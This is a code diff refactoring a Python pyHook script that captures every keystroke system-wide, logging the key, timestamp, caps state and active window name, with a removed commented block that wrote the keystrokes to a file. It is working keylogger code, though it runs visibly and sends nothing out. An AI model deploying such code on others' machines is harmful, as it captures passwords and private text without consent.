@@ -16,122 +16,109 @@ def load_cfg(path):
     except Exception as e:
         print("Exception: ", e)
     return jsonres
+
+class Logger:
+
+    def __init__(self):
+        self.caps = False # is capital?
     
-    
-def OnKeyboardEventUp(event):
-    # Check exit condition
-    if chr(event.Ascii) == ']': 
-        sys.exit(1)
+    def OnKeyboardEventUp(self, event):
+        print("keyboard event UP")
+        # Check exit condition
+        if chr(event.Ascii) == ']': 
+            sys.exit(1)
+            
+        # Check for 'shift' key
+        if event.Key == "Lshift" or event.Key == "Rshift":
+            self.toggleCaps()
+            
+        # Create KeyEvent object
+        # now = datetime.now()
+        # now_datetime = now.strftime("%d/%m/%Y %H:%M:%S")
+        # now_epoch = now.timestamp()
+        # isCaps = self.caps
+        # keyEvent = KeyEvent(now_datetime, now_epoch, event.MessageName, event.WindowName, event.Ascii, chr(event.Ascii), event.keyName, isCaps, self.processKey(chr(event.Ascii), isCaps))
+        keyEvent = self.createKeyEvent(event)
         
-    # Create KeyEvent object
-    now = datetime.now()
-    now_datetime = now.strftime("%d/%m/%Y %H:%M:%S")
-    now_epoch = now.timestamp()
-    isCaps = True
-    event = KeyEvent(now_datetime, now_epoch, event.MessageName, event.WindowName, event.Ascii, chr(event.Ascii), isCaps, processKey(chr(event.Ascii), isCaps))
-    
-    # Print for debugging
-    # print(datetime.now().strftime("%d/%m/%Y %H:%M:%S"))
-    # print ('MessageName:',event.MessageName)
-    # print ('WindowName:',event.WindowName)
-    # print ('Ascii:', event.Ascii, chr(event.Ascii))
-    print(event)
-    print ('---')
-    
-    # Store KeyEvent
-    eventManager.addEvent(event)
-    
-    return True
-
-    
-def OnKeyboardEventDown(event):
-    # Check exit condition
-    if chr(event.Ascii) == ']': 
-        sys.exit(1)
+        # print(event.KeyID)
+        # print(event.Message)
+        # print(event.Key)
+        # print(event.ScanCode)
+        # Print for debugging
+        # print(datetime.now().strftime("%d/%m/%Y %H:%M:%S"))
+        # print ('MessageName:',event.MessageName)
+        # print ('WindowName:',event.WindowName)
+        # print ('Ascii:', event.Ascii, chr(event.Ascii))
+        print(keyEvent)
+        print ('---')
         
-    # Create KeyEvent object
-    now = datetime.now()
-    now_datetime = now.strftime("%d/%m/%Y %H:%M:%S")
-    now_epoch = now.timestamp()
-    isCaps = True
-    event = KeyEvent(now_datetime, now_epoch, event.MessageName, event.WindowName, event.Ascii, chr(event.Ascii), isCaps, processKey(chr(event.Ascii), isCaps))
+        # Store KeyEvent
+        eventManager.addEvent(keyEvent)
+        
+        return True
     
-    # Print for debugging
-    # print(datetime.now().strftime("%d/%m/%Y %H:%M:%S"))
-    # print ('MessageName:',event.MessageName)
-    # print ('WindowName:',event.WindowName)
-    # print ('Ascii:', event.Ascii, chr(event.Ascii))
-    print(event)
-    print ('---')
+        
+    def OnKeyboardEventDown(self, event):
+        print("keyboard event DOWN")
     
-    # Store KeyEvent
-    eventManager.addEvent(event)
+        # Check exit condition
+        if chr(event.Ascii) == ']': 
+            sys.exit(1)
+            
+        # Check for 'shift' key
+        if event.Key == "Lshift" or event.Key == "Rshift":
+            self.toggleCaps()
+        
+        # Check for 'capslock' key
+        if event.Key == "Capital":
+            self.toggleCaps()
+            
+        # Create KeyEvent object
+        # now = datetime.now()
+        # now_datetime = now.strftime("%d/%m/%Y %H:%M:%S")
+        # now_epoch = now.timestamp()
+        # isCaps = self.caps
+        # event = KeyEvent(now_datetime, now_epoch, event.MessageName, event.WindowName, event.Ascii, chr(event.Ascii), event.keyName, isCaps, self.processKey(chr(event.Ascii), isCaps))
+        
+        keyEvent = self.createKeyEvent(event)
+        
+        # Print for debugging
+        # print(datetime.now().strftime("%d/%m/%Y %H:%M:%S"))
+        # print ('MessageName:',event.MessageName)
+        # print ('WindowName:',event.WindowName)
+        # print ('Ascii:', event.Ascii, chr(event.Ascii))
+        print(keyEvent)
+        print ('---')
+        
+        # Store KeyEvent
+        eventManager.addEvent(keyEvent)
+        
+        return True
+        
+    def createKeyEvent(self, event):
+        now = datetime.now()
+        now_datetime = now.strftime("%d/%m/%Y %H:%M:%S")
+        now_epoch = now.timestamp()
+        isCaps = self.caps
+        keyEvent = KeyEvent(now_datetime, now_epoch, event.MessageName, event.WindowName, event.Ascii, chr(event.Ascii), event.Key, isCaps, self.processKey(chr(event.Ascii), isCaps))
+        return keyEvent
     
-    return True
-    
-def OnKeyboardEvent(event): 
-    print(datetime.now().strftime("%d/%m/%Y %H:%M:%S"))
-    print ('MessageName:',event.MessageName)
-    # print ('Message:',event.Message)
-    # print ('Time:',event.Time)
-    # print ('Window:',event.Window)
-    print ('WindowName:',event.WindowName)
-    print ('Ascii:', event.Ascii, chr(event.Ascii))
-    # print ('Key:', event.Key)
-    # print ('KeyID:', event.KeyID)
-    # print ('ScanCode:', event.ScanCode)
-    # print(datetime.datetime(1970, 1, 1) + datetime.timedelta(seconds=(-event.Time)))
-
-    # print ('Extended:', event.Extended)
-    # print ('Injected:', event.Injected)
-    # print ('Alt', event.Alt)
-    # print ('Transition', event.Transition)
-    # print(event.flags)
-    
-    if event.Ascii==5 or chr(event.Ascii) == ']': 
-        sys.exit(1)
-    now = datetime.now()
-    now_datetime = now.strftime("%d/%m/%Y %H:%M:%S")
-    now_epoch = now.timestamp()
-    isCaps = True
-    event = KeyEvent(now_datetime, now_epoch, event.MessageName, event.WindowName, event.Ascii, chr(event.Ascii), isCaps, processKey(chr(event.Ascii), isCaps))
-    print(event)
-    print ('---')
-    eventManager.addEvent(event)
-    # if event.Ascii !=0 or 8:
-    
-    # #open output.txt to read current keystrokes 
-    #     f = open(os.getcwd()+'\output.txt', 'r+') 
-    #     buffer = f.read()
-    #     f.truncate()
-    #     f.close() 
-    # # open output.txt to write current + new keystrokes 
-    #     f = open(os.getcwd()+'\output.txt', 'w') 
-    #     keylogs = chr(event.Ascii) 
-    #     if event.Ascii == 13: 
-    #         kkkeylogs = '/n'
-    #     buffer += keylogs 
-    #     f.write(buffer) 
-    #     f.close()
-    
-    # eventManager.addEvent(event.Ascii, chr(event.Ascii), )
+    def toggleCaps(self):
+        self.caps = not self.caps
     
     
-    return True
-
-
-'''
-This function returns the character for a key after processing for capslock
-
-If the key is alphabetical, return the upper/lower version depending on caps state
-Otherwise, return the key itself
-'''
-def processKey(lowerKey, isCaps):
-    # if lowerKey.isAlpha():
-    if not isCaps:
-        return lowerKey
-    return lowerKey.upper()
-    # return lowerKey
+    '''
+    This function returns the character for a key after processing for capslock
+    
+    If the key is alphabetical, return the upper/lower version depending on caps state
+    Otherwise, return the key itself
+    '''
+    def processKey(self, lowerKey, isCaps):
+        # if lowerKey.isAlpha():
+        if not isCaps:
+            return lowerKey
+        return lowerKey.upper()
+        # return lowerKey
 
 
 if __name__ == "__main__":
@@ -141,13 +128,15 @@ if __name__ == "__main__":
     
     eventManager = EventManager()
     
+    logger = Logger()
+    
     try:
     	# create a hook manager object 
     	hm = pyHook.HookManager() 
     	
     	# Map key events
-    	hm.keyup = OnKeyboardEventUp
-    	hm.keydown = OnKeyboardEventDown
+    	hm.KeyUp = logger.OnKeyboardEventUp
+    	hm.KeyDown = logger.OnKeyboardEventDown
     	
     	# set the hook 
     	hm.HookKeyboard() 
@@ -155,6 +144,7 @@ if __name__ == "__main__":
     	# wait forever 
     	pythoncom.PumpMessages()
     except KeyboardInterrupt:
+        print("===Keyboard interrupt")
         sys.exit(1)
     except Exception as e:
     	print("Exception: ",e)
